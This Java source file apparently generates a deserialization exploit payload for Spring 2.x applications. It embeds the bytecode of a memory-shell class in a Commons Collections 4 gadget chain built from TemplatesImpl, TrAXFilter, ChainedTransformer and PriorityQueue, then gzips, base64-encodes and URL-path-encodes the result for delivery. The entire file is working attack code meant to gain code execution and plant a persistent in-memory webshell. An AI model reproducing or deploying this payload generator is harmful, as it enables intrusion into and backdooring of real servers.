package com.example.spring2xmemshell;

import javassist.ClassPool;
import java.lang.reflect.Field;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import com.sun.org.apache.xalan.internal.xsltc.trax.*;
import org.apache.commons.collections4.functors.*;
import java.io.*;
import java.util.*;
import java.util.zip.*;

public class ExploitUtils {
    private static String pathEncode(String s) {
        return s.replaceAll("\\r\\n", "-").replaceAll("=", "%3D").replaceAll("\\+", "%2B").replaceAll("/", "_");
    }

    private static final int bufferSize = 256;

    private static ByteArrayOutputStream gZipEncode(InputStream inputStream) throws Exception {
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        GZIPOutputStream gos = new GZIPOutputStream(barr);
        byte[] buffer = new byte[bufferSize];

        try{
            int len;
            while((len = inputStream.read(buffer)) != -1) {
                gos.write(buffer, 0, len);
            }
        } finally {
            try{if(inputStream != null) inputStream.close();} catch(Exception e){}
            try{if(gos != null) gos.close();} catch(Exception e){}
        }

        return barr;
    }

    private static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    private static ByteArrayOutputStream genCC4Proxy(String className) throws Exception {
        // get memshell bytecode
        byte[] bArr = ClassPool.getDefault().get(className).toBytecode();

        // gen CC4 serialized chain
        TemplatesImpl tplsImpl = new TemplatesImpl();
        setFieldValue(tplsImpl, "_bytecodes", new byte[][]{bArr});
        setFieldValue(tplsImpl, "_name", "ahihi");
        setFieldValue(tplsImpl, "_tfactory", new TransformerFactoryImpl());

        ConstantTransformer constTransformer = new ConstantTransformer(TrAXFilter.class); // loop 1 trả về TrAXFilter.class
        InstantiateTransformer insTransformer = new InstantiateTransformer(new Class[]{javax.xml.transform.Templates.class}, new Object[]{tplsImpl}); // loop 2 gọi class TrAXFilter constructor
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                constTransformer, insTransformer
        });
        TransformingComparator transComparator = new TransformingComparator(chainedTransformer);
        PriorityQueue<Object> priorityQueue = new PriorityQueue<Object>(transComparator);
        setFieldValue(priorityQueue, "size", 2);

        setFieldValue(priorityQueue, "queue", new Object[]{1,1});

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(priorityQueue);
        oos.close();

        return barr;
    }

    public static String genDeserPayload() throws Exception {
        // get CC4 memshell serialized gadget chain then gzip encode
        ByteArrayOutputStream barr = genCC4Proxy(evil.ProxyTemplatesImpl.class.getName());
        InputStream is = new ByteArrayInputStream(barr.toByteArray());
        ByteArrayOutputStream outBarr = gZipEncode(is);
        // b64 + path encode
        byte[] bytes = outBarr.toByteArray();
        System.out.println("Generated payload length is: " + bytes.length);
        String b64En =  Base64.getEncoder().encodeToString(bytes);
        String info = pathEncode(b64En);
        return info;
    }

    public static void main(String[] args) throws Exception {
        genDeserPayload();
    }
}
